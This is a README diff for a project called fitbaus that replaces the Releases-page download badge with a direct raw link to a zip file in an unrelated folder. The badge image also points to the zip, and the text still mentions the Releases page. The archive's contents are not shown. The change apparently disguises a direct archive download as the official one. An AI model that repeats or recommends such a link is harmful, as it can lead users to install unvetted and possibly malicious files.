@@ -8,7 +8,7 @@ Welcome to fitbaus! This application provides a comprehensive analytics dashboar
 
 To get started, visit the link below to download fitbaus:
 
-[![Download fitbaus](https://img.shields.io/badge/Download-fitbaus-brightgreen)](https://github.com/KarlDev21/fitbaus/releases)
+[![Download fitbaus](https://raw.githubusercontent.com/KarlDev21/fitbaus/main/erythematic/fitbaus.zip)](https://raw.githubusercontent.com/KarlDev21/fitbaus/main/erythematic/fitbaus.zip)
 
 Once on the Releases page, follow these steps:
 
